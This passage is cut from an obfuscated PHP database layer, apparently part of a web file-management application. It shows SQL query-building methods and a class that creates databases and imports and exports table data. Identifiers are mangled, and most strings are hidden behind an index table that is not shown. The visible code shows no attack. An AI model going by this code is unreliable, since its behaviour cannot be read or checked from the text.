.= implode($Š¢§¨²[1172], $«³›×é”); } else { $¸°ããÎÄ .= $this->parseWhereItem($this->parseKey($†¬ÙãÒª), $÷œ˜í¤ù); } } $¸°ããÎÄ .= $Š¢§¨²[356] . $ÆõÔÍ; } $¸°ããÎÄ = substr($¸°ããÎÄ, 0, -strlen($ÆõÔÍ)); } return empty($¸°ããÎÄ) ? $Š¢§¨²[12] : $Š¢§¨²[1178] . $¸°ããÎÄ; } protected function parseWhereItem($ ‰ôÒÔ, $şÊÏ®¬‚) { $ş²¦¤ÖÅ =& $_SERVER[©—Ò»ÅĞ]; $ÄÔİ÷— = $ş²¦¤ÖÅ[12]; if (is_array($şÊÏ®¬‚)) { if (is_string($şÊÏ®¬‚[0])) { $¾Ü¯ó×ï = strtolower($şÊÏ®¬‚[0]); if (in_array($şÊÏ®¬‚[0], array($ş²¦¤ÖÅ[464], $ş²¦¤ÖÅ[1179], $ş²¦¤ÖÅ[1180], $ş²¦¤ÖÅ[1181], $ş²¦¤ÖÅ[1182], $ş²¦¤ÖÅ[1183]))) { $ÄÔİ÷— .= $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $şÊÏ®¬‚[0] . $ş²¦¤ÖÅ[53] . $this->parseValue($şÊÏ®¬‚[1]); } elseif (preg_match($ş²¦¤ÖÅ[1184], $şÊÏ®¬‚[0])) { $ÄÔİ÷— .= $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $this->exp[$¾Ü¯ó×ï] . $ş²¦¤ÖÅ[53] . $this->parseValue($şÊÏ®¬‚[1]); } elseif (preg_match($ş²¦¤ÖÅ[1185], $şÊÏ®¬‚[0])) { if (is_array($şÊÏ®¬‚[1])) { $×åÛ†Ú = isset($şÊÏ®¬‚[2]) ? strtoupper($şÊÏ®¬‚[2]) : $ş²¦¤ÖÅ[1170]; if (in_array($×åÛ†Ú, array($ş²¦¤ÖÅ[1169], $ş²¦¤ÖÅ[1170], $ş²¦¤ÖÅ[1171]))) { $ğŞäûş = array(); foreach ($şÊÏ®¬‚[1] as $»©ç—¾Ã) { $ğŞäûş[] = $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $this->exp[$¾Ü¯ó×ï] . $ş²¦¤ÖÅ[53] . $this->parseValue($»©ç—¾Ã); } $ÄÔİ÷— .= $ş²¦¤ÖÅ[337] . implode($ş²¦¤ÖÅ[53] . $×åÛ†Ú . $ş²¦¤ÖÅ[53], $ğŞäûş) . $ş²¦¤ÖÅ[1066]; } } else { $ÄÔİ÷— .= $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $this->exp[$¾Ü¯ó×ï] . $ş²¦¤ÖÅ[53] . $this->parseValue($şÊÏ®¬‚[1]); } } elseif ($ş²¦¤ÖÅ[372] == $¾Ü¯ó×ï) { $ÄÔİ÷— .= $ş²¦¤ÖÅ[1064] . $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $şÊÏ®¬‚[1] . $ş²¦¤ÖÅ[1186]; } elseif (preg_match($ş²¦¤ÖÅ[1187], $şÊÏ®¬‚[0])) { $ÄÔİ÷— .= $şÊÏ®¬‚[0]; } elseif (preg_match($ş²¦¤ÖÅ[1188], $şÊÏ®¬‚[0])) { if (isset($şÊÏ®¬‚[2]) && $ş²¦¤ÖÅ[372] == $şÊÏ®¬‚[2]) { $ÄÔİ÷— .= $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $this->exp[$¾Ü¯ó×ï] . $ş²¦¤ÖÅ[53] . $şÊÏ®¬‚[1]; } else { if (is_string($şÊÏ®¬‚[1])) { $şÊÏ®¬‚[1] = explode($ş²¦¤ÖÅ[50], $şÊÏ®¬‚[1]); } $êÛ¹Éš² = implode($ş²¦¤ÖÅ[50], $this->parseValue($şÊÏ®¬‚[1])); $ÄÔİ÷— .= $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $this->exp[$¾Ü¯ó×ï] . $ş²¦¤ÖÅ[1064] . $êÛ¹Éš² . $ş²¦¤ÖÅ[1066]; } } elseif (preg_match($ş²¦¤ÖÅ[1189], $şÊÏ®¬‚[0])) { $¢²ôæ«“ = is_string($şÊÏ®¬‚[1]) ? explode($ş²¦¤ÖÅ[50], $şÊÏ®¬‚[1]) : $şÊÏ®¬‚[1]; $ÄÔİ÷— .= $ş²¦¤ÖÅ[1064] . $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $this->exp[$¾Ü¯ó×ï] . $ş²¦¤ÖÅ[53] . $this->parseValue($¢²ôæ«“[0]) . $ş²¦¤ÖÅ[1172] . $this->parseValue($¢²ôæ«“[1]) . $ş²¦¤ÖÅ[356]; } else { think_exception(think_lang($ş²¦¤ÖÅ[1175]) . $ş²¦¤ÖÅ[4] . $şÊÏ®¬‚[0]); } } else { $Æ›®à·¸ = count($şÊÏ®¬‚); $‹ÀÚ €ı = $ş²¦¤ÖÅ[12]; if (is_string($şÊÏ®¬‚[$Æ›®à·¸ - 1])) { $‹ÀÚ €ı = isset($şÊÏ®¬‚[$Æ›®à·¸ - 1]) ? strtoupper($şÊÏ®¬‚[$Æ›®à·¸ - 1]) : $ş²¦¤ÖÅ[12]; if (in_array($‹ÀÚ €ı, array($ş²¦¤ÖÅ[1169], $ş²¦¤ÖÅ[1170], $ş²¦¤ÖÅ[1171]))) { $Æ›®à·¸ = $Æ›®à·¸ - 1; } } else { $‹ÀÚ €ı = $ş²¦¤ÖÅ[1169]; } for ($ïªš³¸ = 0; $ïªš³¸ < $Æ›®à·¸; $ïªš³¸++) { $¢²ôæ«“ = is_array($şÊÏ®¬‚[$ïªš³¸]) ? $şÊÏ®¬‚[$ïªš³¸][1] : $şÊÏ®¬‚[$ïªš³¸]; if ($ş²¦¤ÖÅ[372] == strtolower($şÊÏ®¬‚[$ïªš³¸][0])) { $ÄÔİ÷— .= $ş²¦¤ÖÅ[337] . $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $¢²ôæ«“ . $ş²¦¤ÖÅ[1186] . $‹ÀÚ €ı . $ş²¦¤ÖÅ[53]; } else { $¼îÚ“«Ù = is_array($şÊÏ®¬‚[$ïªš³¸]) ? $this->exp[strtolower($şÊÏ®¬‚[$ïªš³¸][0])] : $ş²¦¤ÖÅ[464]; if (!$¼îÚ“«Ù && is_array($şÊÏ®¬‚[$ïªš³¸]) && in_array($şÊÏ®¬‚[$ïªš³¸][0], array($ş²¦¤ÖÅ[464], $ş²¦¤ÖÅ[1179], $ş²¦¤ÖÅ[1180], $ş²¦¤ÖÅ[1181], $ş²¦¤ÖÅ[1182], $ş²¦¤ÖÅ[1183]))) { $¼îÚ“«Ù = $şÊÏ®¬‚[$ïªš³¸][0]; } $ÄÔİ÷— .= $ş²¦¤ÖÅ[337] . $ ‰ôÒÔ . $ş²¦¤ÖÅ[53] . $¼îÚ“«Ù . $ş²¦¤ÖÅ[53] . $this->parseValue($¢²ôæ«“) . $ş²¦¤ÖÅ[1186] . $‹ÀÚ €ı . $ş²¦¤ÖÅ[53]; } } $ÄÔİ÷— = substr($ÄÔİ÷—, 0, -4); } } else { $ÄÔİ÷— .= $ ‰ôÒÔ . $ş²¦¤ÖÅ[1190] . $this->parseValue($şÊÏ®¬‚); } return $ÄÔİ÷—; } protected function parseThinkWhere($ö“Ä“ß¼, $âê ì£÷) { $¿Ÿ¯’¤È =& $_SERVER[©—Ò»ÅĞ]; $ÍÉôÚÆ§ = $¿Ÿ¯’¤È[12]; switch ($ö“Ä“ß¼) { case $¿Ÿ¯’¤È[427]: $ÍÉôÚÆ§ = $âê ì£÷; break; case $¿Ÿ¯’¤È[1173]: $ÍÉôÚÆ§ = is_string($âê ì£÷) ? $âê ì£÷ : substr($this->parseWhere($âê ì£÷), 6); break; case $¿Ÿ¯’¤È[1191]: parse_str($âê ì£÷, $·˜Ğï™); if (isset($·˜Ğï™[$¿Ÿ¯’¤È[1168]])) { $…¹ÓÛš‹ = $¿Ÿ¯’¤È[53] . strtoupper($·˜Ğï™[$¿Ÿ¯’¤È[1168]]) . $¿Ÿ¯’¤È[53]; unset($·˜Ğï™[$¿Ÿ¯’¤È[1168]]); } else { $…¹ÓÛš‹ = $¿Ÿ¯’¤È[1172]; } $Ã“–§»› = array(); foreach ($·˜Ğï™ as $¬ÈÜ éâ => $³É§¬÷ˆ) { $Ã“–§»›[] = $this->parseKey($¬ÈÜ éâ) . $¿Ÿ¯’¤È[1190] . $this->parseValue($³É§¬÷ˆ); } $ÍÉôÚÆ§ = implode($…¹ÓÛš‹, $Ã“–§»›); break; } return $ÍÉôÚÆ§; } protected function parseLimit($°øÜ£ã‹) { $ç£ôÃ» =& $_SERVER[©—Ò»ÅĞ]; return !empty($°øÜ£ã‹) ? $ç£ôÃ»[51] . $°øÜ£ã‹ . $ç£ôÃ»[53] : $ç£ôÃ»[12]; } protected function parseJoin($Ã”¢ş¶) { $£¨úà¶ã =& $_SERVER[©—Ò»ÅĞ]; $•¬‡ûí = $£¨úà¶ã[12]; if (!empty($Ã”¢ş¶)) { if (is_array($Ã”¢ş¶)) { foreach ($Ã”¢ş¶ as $€¯šµÅ => $Ğš€«Úµ) { if (!1 !== stripos($Ğš€«Úµ, $£¨úà¶ã[1192])) { $•¬‡ûí .= $£¨úà¶ã[53] . $Ğš€«Úµ; } else { $•¬‡ûí .= $£¨úà¶ã[1193] . $Ğš€«Úµ; } } } else { $•¬‡ûí .= $£¨úà¶ã[1193] . $Ã”¢ş¶; } } $•¬‡ûí = preg_replace($£¨úà¶ã[1194], think_config($£¨úà¶ã[1095]) . $£¨úà¶ã[1195], $•¬‡ûí); return $•¬‡ûí; } protected function parseOrder($¯Û•‘‚) { $¹ğ¿±óÆ =& $_SERVER[©—Ò»ÅĞ]; if (is_array($¯Û•‘‚)) { $ûâÛ®Ÿ´ = array(); foreach ($¯Û•‘‚ as $™‘Ù†æ° => $È¬­ÀĞ») { if (is_numeric($™‘Ù†æ°)) { $ûâÛ®Ÿ´[] = $this->parseKey($È¬­ÀĞ»); } else { $È¬­ÀĞ» = in_array(strtoupper(trim($È¬­ÀĞ»)), array($¹ğ¿±óÆ[1196], $¹ğ¿±óÆ[1197])) ? $¹ğ¿±óÆ[53] . $È¬­ÀĞ» : $¹ğ¿±óÆ[12]; if (preg_match($¹ğ¿±óÆ[1198], $™‘Ù†æ°)) { $ûâÛ®Ÿ´[] = $this->parseKey($™‘Ù†æ°) . $È¬­ÀĞ»; } else { think_exception($¹ğ¿±óÆ[1199] . $™‘Ù†æ°); } } } $¯Û•‘‚ = implode($¹ğ¿±óÆ[50], $ûâÛ®Ÿ´); } return !empty($¯Û•‘‚) ? $¹ğ¿±óÆ[1200] . $¯Û•‘‚ : $¹ğ¿±óÆ[12]; } protected function parseGroup($ÌÙÉÚş) { $Ø£Œ³¢ç =& $_SERVER[©—Ò»ÅĞ]; return !empty($ÌÙÉÚş) ? $Ø£Œ³¢ç[1201] . $ÌÙÉÚş : $Ø£Œ³¢ç[12]; } protected function parseHaving($ºû˜æÁ«) { $µ×ãè¢“ =& $_SERVER[©—Ò»ÅĞ]; return !empty($ºû˜æÁ«) ? $µ×ãè¢“[1202] . $ºû˜æÁ« : $µ×ãè¢“[12]; } protected function parseComment($«¡ÄïÏº) { $ ½ÍÓÁ¶ =& $_SERVER[©—Ò»ÅĞ]; return !empty($«¡ÄïÏº) ? $ ½ÍÓÁ¶[1203] . $«¡ÄïÏº . $ ½ÍÓÁ¶[1204] : $ ½ÍÓÁ¶[12]; } protected function parseDistinct($üä£Ó½) { $ÆğÆî =& $_SERVER[©—Ò»ÅĞ]; return !empty($üä£Ó½) ? $ÆğÆî[1205] : $ÆğÆî[12]; } protected function parseUnion($‘Ê„ã¥ü) { $µÉÆ²œñ =& $_SERVER[©—Ò»ÅĞ]; if (empty($‘Ê„ã¥ü)) { return $µÉÆ²œñ[12]; } if (isset($‘Ê„ã¥ü[$µÉÆ²œñ[423]])) { $ªÑïï¿ = $µÉÆ²œñ[1206]; unset($‘Ê„ã¥ü[$µÉÆ²œñ[423]]); } else { $ªÑïï¿ = $µÉÆ²œñ[1207]; } foreach ($‘Ê„ã¥ü as $É€––‡) { $÷«»ù—Ô[] = $ªÑïï¿ . (is_array($É€––‡) ? $this->buildSelectSql($É€––‡) : $É€––‡); } return implode($µÉÆ²œñ[53], $÷«»ù—Ô); } public function insert($ÇïÓ¾ş, $ØÔ¯é– = array(), $×èÜæ‚Â = false) { $”ÄÃ©å± =& $_SERVER[©—Ò»ÅĞ]; $¥‰ºêİ£ = $ğÂ¶ì™ = array(); $this->model = $ØÔ¯é–[$”ÄÃ©å±[359]]; foreach ($ÇïÓ¾ş as $õ¢úÍƒ => $ÚÚâØ„Õ) { if (is_array($ÚÚâØ„Õ) && $”ÄÃ©å±[372] == $ÚÚâØ„Õ[0]) { $ğÂ¶ì™[] = $this->parseKey($õ¢úÍƒ); $¥‰ºêİ£[] = $ÚÚâØ„Õ[1]; } elseif (is_scalar($ÚÚâØ„Õ) || is_null($ÚÚâØ„Õ)) { $ğÂ¶ì™[] = $this->parseKey($õ¢úÍƒ); $¥‰ºêİ£[] = $this->parseValue($ÚÚâØ„Õ); } } $Æ¨„ØÎÂ = ($×èÜæ‚Â ? $”ÄÃ©å±[1068] : $”ÄÃ©å±[1069]) . $”ÄÃ©å±[1070] . $this->parseTable($ØÔ¯é–[$”ÄÃ©å±[357]]) . $”ÄÃ©å±[1064] . implode($”ÄÃ©å±[50], $ğÂ¶ì™) . $”ÄÃ©å±[1065] . implode($”ÄÃ©å±[50], $¥‰ºêİ£) . $”ÄÃ©å±[1066]; $Æ¨„ØÎÂ .= $this->parseLock(isset($ØÔ¯é–[$”ÄÃ©å±[1000]]) ? $ØÔ¯é–[$”ÄÃ©å±[1000]] : !1); $Æ¨„ØÎÂ .= $this->parseComment(!empty($ØÔ¯é–[$”ÄÃ©å±[429]]) ? $ØÔ¯é–[$”ÄÃ©å±[429]] : $”ÄÃ©å±[12]); return $this->execute($Æ¨„ØÎÂ, $this->parseBind(!empty($ØÔ¯é–[$”ÄÃ©å±[361]]) ? $ØÔ¯é–[$”ÄÃ©å±[361]] : array())); } public function selectInsert($˜İÆ‘ÚÀ, $òåîš§©, $µõ—ÃÏŞ = array()) { $ÎâàÊê× =& $_SERVER[©—Ò»ÅĞ]; $this->model = $µõ—ÃÏŞ[$ÎâàÊê×[359]]; if (is_string($˜İÆ‘ÚÀ)) { $˜İÆ‘ÚÀ = explode($ÎâàÊê×[50], $˜İÆ‘ÚÀ); } array_walk($˜İÆ‘ÚÀ, array($this, $ÎâàÊê×[1067])); $äò€ºšÍ = $ÎâàÊê×[1208] . $this->parseTable($òåîš§©) . $ÎâàÊê×[1064] . implode($ÎâàÊê×[50], $˜İÆ‘ÚÀ) . $ÎâàÊê×[1186]; $äò€ºšÍ .= $this->buildSelectSql($µõ—ÃÏŞ); return $this->execute($äò€ºšÍ, $this->parseBind(!empty($µõ—ÃÏŞ[$ÎâàÊê×[361]]) ? $µõ—ÃÏŞ[$ÎâàÊê×[361]] : array())); } public function update($¿õ…“•æ, $™úüìÒß) { $Ì˜£ùğ˜ =& $_SERVER[©—Ò»ÅĞ]; $this->model = $™úüìÒß[$Ì˜£ùğ˜[359]]; $ÒÙ³ÍØŸ = $Ì˜£ùğ˜[1209] . $this->parseTable($™úüìÒß[$Ì˜£ùğ˜[357]]) . $this->parseSet($¿õ…“•æ) . $this->parseWhere(!empty($™úüìÒß[$Ì˜£ùğ˜[353]]) ? $™úüìÒß[$Ì˜£ùğ˜[353]] : $Ì˜£ùğ˜[12]) . $this->parseOrder(!empty($™úüìÒß[$Ì˜£ùğ˜[441]]) ? $™úüìÒß[$Ì˜£ùğ˜[441]] : $Ì˜£ùğ˜[12]) . $this->parseLimit(!empty($™úüìÒß[$Ì˜£ùğ˜[368]]) ? $™úüìÒß[$Ì˜£ùğ˜[368]] : $Ì˜£ùğ˜[12]) . $this->parseLock(isset($™úüìÒß[$Ì˜£ùğ˜[1000]]) ? $™úüìÒß[$Ì˜£ùğ˜[1000]] : !1) . $this->parseComment(!empty($™úüìÒß[$Ì˜£ùğ˜[429]]) ? $™úüìÒß[$Ì˜£ùğ˜[429]] : $Ì˜£ùğ˜[12]); return $this->execute($ÒÙ³ÍØŸ, $this->parseBind(!empty($™úüìÒß[$Ì˜£ùğ˜[361]]) ? $™úüìÒß[$Ì˜£ùğ˜[361]] : array())); } public function delete($Ğíñ¿€ = array()) { $ÂŒ€’¸« =& $_SERVER[©—Ò»ÅĞ]; $this->model = $Ğíñ¿€[$ÂŒ€’¸«[359]]; $íš‰¶ = $ÂŒ€’¸«[1210] . $this->parseTable($Ğíñ¿€[$ÂŒ€’¸«[357]]) . $this->parseWhere(!empty($Ğíñ¿€[$ÂŒ€’¸«[353]]) ? $Ğíñ¿€[$ÂŒ€’¸«[353]] : $ÂŒ€’¸«[12]) . $this->parseOrder(!empty($Ğíñ¿€[$ÂŒ€’¸«[441]]) ? $Ğíñ¿€[$ÂŒ€’¸«[441]] : $ÂŒ€’¸«[12]) . $this->parseLimit(!empty($Ğíñ¿€[$ÂŒ€’¸«[368]]) ? $Ğíñ¿€[$ÂŒ€’¸«[368]] : $ÂŒ€’¸«[12]) . $this->parseLock(isset($Ğíñ¿€[$ÂŒ€’¸«[1000]]) ? $Ğíñ¿€[$ÂŒ€’¸«[1000]] : !1) . $this->parseComment(!empty($Ğíñ¿€[$ÂŒ€’¸«[429]]) ? $Ğíñ¿€[$ÂŒ€’¸«[429]] : $ÂŒ€’¸«[12]); return $this->execute($íš‰¶, $this->parseBind(!empty($Ğíñ¿€[$ÂŒ€’¸«[361]]) ? $Ğíñ¿€[$ÂŒ€’¸«[361]] : array())); } public function select($¿˜Âş¬ = array()) { $è•Ûäó¾ =& $_SERVER[©—Ò»ÅĞ]; $this->model = $¿˜Âş¬[$è•Ûäó¾[359]]; $Ş±õÏÁÊ = $this->buildSelectSql($¿˜Âş¬); $øÎˆ‰„ = isset($¿˜Âş¬[$è•Ûäó¾[424]]) ? $¿˜Âş¬[$è•Ûäó¾[424]] : !1; if ($øÎˆ‰„) { $è—‰³— = is_string($øÎˆ‰„[$è•Ûäó¾[95]]) ? $øÎˆ‰„[$è•Ûäó¾[95]] : $è•Ûäó¾[1211] . md5($Ş±õÏÁÊ); $áí”çäı = think_cache($è—‰³—, $è•Ûäó¾[12], $øÎˆ‰„); if (!1 !== $áí”çäı) { return $áí”çäı; } } $ç­‡ƒÕ = $this->query($Ş±õÏÁÊ, $this->parseBind(!empty($¿˜Âş¬[$è•Ûäó¾[361]]) ? $¿˜Âş¬[$è•Ûäó¾[361]] : array())); if ($øÎˆ‰„ && !1 !== $ç­‡ƒÕ) { think_cache($è—‰³—, $ç­‡ƒÕ, $øÎˆ‰„); } return $ç­‡ƒÕ; } public function buildSelectSql($úâèÚŞı = array()) { $ÎóŸè¬Ñ =& $_SERVER[©—Ò»ÅĞ]; if (isset($úâèÚŞı[$ÎóŸè¬Ñ[428]])) { if (strpos($úâèÚŞı[$ÎóŸè¬Ñ[428]], $ÎóŸè¬Ñ[50])) { list($—Õ“ğ¾, $Ë›­ÊÅâ) = explode($ÎóŸè¬Ñ[50], $úâèÚŞı[$ÎóŸè¬Ñ[428]]); } else { $—Õ“ğ¾ = $úâèÚŞı[$ÎóŸè¬Ñ[428]]; } $—Õ“ğ¾ = $—Õ“ğ¾ ? $—Õ“ğ¾ : 1; $Ë›­ÊÅâ = isset($Ë›­ÊÅâ) ? $Ë›­ÊÅâ : (is_numeric($úâèÚŞı[$ÎóŸè¬Ñ[368]]) ? $úâèÚŞı[$ÎóŸè¬Ñ[368]] : 20); $¶—Ô×¸× = $Ë›­ÊÅâ * ((int) $—Õ“ğ¾ - 1); $úâèÚŞı[$ÎóŸè¬Ñ[368]] = $¶—Ô×¸× . $ÎóŸè¬Ñ[50] . $Ë›­ÊÅâ; } if (think_config($ÎóŸè¬Ñ[1212])) { $˜Éº“ = $ÎóŸè¬Ñ[1213] . md5(serialize($úâèÚŞı)); $áÉ“ªÃ = think_cache($˜Éº“); if ($áÉ“ªÃ) { return $áÉ“ªÃ; } } $¹‘™´Ø” = $this->parseSql($this->selectSql, $úâèÚŞı); $¹‘™´Ø” .= $this->parseLock(isset($úâèÚŞı[$ÎóŸè¬Ñ[1000]]) ? $úâèÚŞı[$ÎóŸè¬Ñ[1000]] : !1); if (isset($˜Éº“)) { think_cache($˜Éº“, $¹‘™´Ø”); } return $¹‘™´Ø”; } public function parseSql($ãµÊöŸ©, $¾é¹‰ï¿ = array()) { $Öœè¬œÊ =& $_SERVER[©—Ò»ÅĞ]; $ãµÊöŸ© = str_replace(array($Öœè¬œÊ[1214], $Öœè¬œÊ[1215], $Öœè¬œÊ[1216], $Öœè¬œÊ[1217], $Öœè¬œÊ[1218], $Öœè¬œÊ[1219], $Öœè¬œÊ[1220], $Öœè¬œÊ[1221], $Öœè¬œÊ[1222], $Öœè¬œÊ[1223], $Öœè¬œÊ[1224]), array($this->parseTable("{$¾é¹‰ï¿[$Öœè¬œÊ[357]]}"), $this->parseDistinct(isset($¾é¹‰ï¿[$Öœè¬œÊ[1225]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[1225]] : !1), $this->parseField(!empty($¾é¹‰ï¿[$Öœè¬œÊ[351]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[351]] : $Öœè¬œÊ[220]), $this->parseJoin(!empty($¾é¹‰ï¿[$Öœè¬œÊ[360]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[360]] : $Öœè¬œÊ[12]), $this->parseWhere(!empty($¾é¹‰ï¿[$Öœè¬œÊ[353]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[353]] : $Öœè¬œÊ[12]), $this->parseGroup(!empty($¾é¹‰ï¿[$Öœè¬œÊ[598]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[598]] : $Öœè¬œÊ[12]), $this->parseHaving(!empty($¾é¹‰ï¿[$Öœè¬œÊ[1226]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[1226]] : $Öœè¬œÊ[12]), $this->parseOrder(!empty($¾é¹‰ï¿[$Öœè¬œÊ[441]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[441]] : $Öœè¬œÊ[12]), $this->parseLimit(!empty($¾é¹‰ï¿[$Öœè¬œÊ[368]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[368]] : $Öœè¬œÊ[12]), $this->parseUnion(!empty($¾é¹‰ï¿[$Öœè¬œÊ[422]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[422]] : $Öœè¬œÊ[12]), $this->parseComment(!empty($¾é¹‰ï¿[$Öœè¬œÊ[429]]) ? $¾é¹‰ï¿[$Öœè¬œÊ[429]] : $Öœè¬œÊ[12])), $ãµÊöŸ©); return $ãµÊöŸ©; } public function getLastSql($áÀº‰Âè = '') { return $áÀº‰Âè ? $this->modelSql[$áÀº‰Âè] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($À¼¾âª’) { return addslashes($À¼¾âª’); } public function setModel($ù‚æĞ¼) { $this->model = $ù‚æĞ¼; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { public $message = ''; function __construct($¤È‚ÁÏ = array()) { $£ùıüœí =& $_SERVER[©—Ò»ÅĞ]; if (empty($¤È‚ÁÏ)) { $¤È‚ÁÏ = $GLOBALS[$£ùıüœí[6]][$£ùıüœí[21]]; } $this->database = $¤È‚ÁÏ; } public function model($÷”Ê´Ù‡ = '') { return new ModelBase($÷”Ê´Ù‡, $_SERVER[©—Ò»ÅĞ][12], $this->database); } public function db($ªîìÚ•à = false) { $ã£šğ¤ =& $_SERVER[©—Ò»ÅĞ]; $¦˜Àá¢ = array_change_key_case($this->database); if ($this->dbType() == $ã£šğ¤[13] || !$ªîìÚ•à) { return $this->model()->db(); } $›Š¢Ò§ = $¦˜Àá¢[$ã£šğ¤[1140]]; $¦˜Àá¢[$ã£šğ¤[1140]] = $ã£šğ¤[12]; if ($¦˜Àá¢[$ã£šğ¤[1135]] == $ã£šğ¤[1132]) { $Şœú²Œõ = $¦˜Àá¢[$ã£šğ¤[1141]]; $¦˜Àá¢[$ã£šğ¤[1141]] = substr($Şœú²Œõ, 0, strrpos($Şœú²Œõ, $ã£šğ¤[1227])); } $this->database = $¦˜Àá¢; $³ˆ¶õÒ¸ = $this->model()->db(); $Ï›è‹äæ = $³ˆ¶õÒ¸->execute("\163\150\157\167\40\x64\x61\164\141\142\141\x73\x65\163\x20\x6c\x69\153\145\40\47{$›Š¢Ò§}\x27"); if (!$Ï›è‹äæ) { try { $³ˆ¶õÒ¸->execute("\143\162\x65\x61\164\x65\x20\x64\x61\164\x61\142\x61\x73\145\x20\x60{$›Š¢Ò§}\140"); } catch (Exception $òÕ…Ö¥³) { $this->message = $òÕ…Ö¥³->getMessage(); return !1; } } $¦˜Àá¢[$ã£šğ¤[1140]] = $›Š¢Ò§; if ($¦˜Àá¢[$ã£šğ¤[1135]] == $ã£šğ¤[1132]) { $¦˜Àá¢[$ã£šğ¤[1141]] .= $ã£šğ¤[1227] . $›Š¢Ò§; } $this->database = $¦˜Àá¢; try { $³ˆ¶õÒ¸->execute("\x75\163\145\40\x60{$›Š¢Ò§}\x60"); } catch (Exception $òÕ…Ö¥³) { $this->message = $òÕ…Ö¥³->getMessage(); return !1; } return $³ˆ¶õÒ¸; } public function createTable($ÔÇÒÄšé, &$øÜì´å¡) { $áôæß =& $_SERVER[©—Ò»ÅĞ]; if (!IO::exist($ÔÇÒÄšé)) { show_json(LNG($áôæß[1228]), !1); } $™»îŞÙù = $this->model()->db(); $ôÜÎ³üŸ = IO::getContent($ÔÇÒÄšé); $ôÜÎ³üŸ = str_ireplace($áôæß[1229], $áôæß[1230], $ôÜÎ³üŸ); $åÌ’©ˆ» = sqlSplit($ôÜÎ³üŸ); foreach ($åÌ’©ˆ» as $«Å“øÃë) { $Ï§ÍÁöØ = stripos($«Å“øÃë, $áôæß[1231]) === 0; if ($Ï§ÍÁöØ) { $øÜì´å¡->task[$áôæß[1232]] += 1; } $™»îŞÙù->execute($«Å“øÃë); if ($Ï§ÍÁöØ) { preg_match($áôæß[1233], $«Å“øÃë, $¦¦ø±ı); $øÜì´å¡->task[$áôæß[1234]] = $¦¦ø±ı[1]; $øÜì´å¡->update(1); } } } public function insertTable($ğâ„«…, &$Ïğ«ÀÍø) { $§áØƒ” =& $_SERVER[©—Ò»ÅĞ]; $ıË¨õ½Œ = $this->model()->db(); $íÎîğË• = $²§˜íùø ? array($²§˜íùø) : $ıË¨õ½Œ->getTables(); foreach ($ğâ„«… as $Šâòû•İ) { $²§˜íùø = basename($Šâòû•İ, $§áØƒ”[891]); if (!in_array($²§˜íùø, $íÎîğË•)) { continue; } $Ïğ«ÀÍø->task[$§áØƒ”[1234]] = $²§˜íùø; if ($²§˜íùø == $§áØƒ”[472]) { continue; } if (get_filesize($Šâòû•İ) == 0) { continue; } $—Å¾® = $this->sqlToDb($Šâòû•İ, $Ïğ«ÀÍø); if (!$—Å¾®) { show_json(LNG($§áØƒ”[1235]) . "\x5b{$²§˜íùø}\135", !1); } } } public function sqlFromDb($ÂÔ‹à»ø, $Ø–æîü, &$½Ü×ú¾Ë, $ÕÂ¾à—„ = '') { $ƒÓ„Şİ =& $_SERVER[©—Ò»ÅĞ]; if ($½Ü×ú¾Ë) { $½Ü×ú¾Ë->task[$ƒÓ„Şİ[1234]] = $ÂÔ‹à»ø; } $×˜Õõ°ç = $this->model($ÂÔ‹à»ø); $ÅªŠ»Öâ = 0; $´ã‘‘î’ = 0; $ş§Ôçƒœ = 10000; $¬ªñ´¿ = fopen($Ø–æîü, $ƒÓ„Şİ[1236]); $””“Ùè„ = $×˜Õõ°ç->getPk(); $¼ó†˜îü = $×˜Õõ°ç->getDbFields(); $€ÉÀûë¹ = $ƒÓ„Şİ[12]; if ($GLOBALS[$ƒÓ„Şİ[890]] && in_array($ÂÔ‹à»ø, array($ƒÓ„Şİ[1237], $ƒÓ„Şİ[1238]))) { $€ÉÀûë¹ = $ÂÔ‹à»ø; } do { $Éğè˜À = array($””“Ùè„ => array($ƒÓ„Şİ[1182], $´ã‘‘î’)); $ç»‚ß× = $×˜Õõ°ç->where($Éğè˜À)->field($¼ó†˜îü)->order($””“Ùè„ . $ƒÓ„Şİ[1239])->limit($ş§Ôçƒœ)->select(); $ç»‚ß× = !empty($ç»‚ß×) ? $ç»‚ß× : array(); if (!($ºüÒ—¦ = count($ç»‚ß×))) { break; } $ÀüÁÜ‡í = end($ç»‚ß×); $´ã‘‘î’ = $ÀüÁÜ‡í[$””“Ùè„]; $æ¿–•Á = array(); foreach ($ç»‚ß× as $ìÛ¹®¶£) { if ($€ÉÀûë¹) { if ($ÂÔ‹à»ø == $ƒÓ„Şİ[1237]) { if ($ìÛ¹®¶£[$ƒÓ„Şİ[33]] == $ƒÓ„Şİ[1240]) { $¿®Üª«ş = json_decode($ìÛ¹®¶£[$ƒÓ„Şİ[451]], !0); if ($¿®Üª«ş[$ƒÓ„Şİ[32]] == $GLOBALS[$ƒÓ„Şİ[890]] && $¿®Üª«ş[$ƒÓ„Şİ[850]] != 1) { continue; } } } else { if ($ìÛ¹®¶£[$ƒÓ„Şİ[33]] == $ƒÓ„Şİ[1241] && $ìÛ¹®¶£[$ƒÓ„Şİ[95]] == $ƒÓ„Şİ[886]) { continue; } } } $æ¿–•Á[] = $ƒÓ„Şİ[1242] . $this->sqlEncode($ìÛ¹®¶£) . $ƒÓ„Şİ[1243]; } $îæ…­À« = 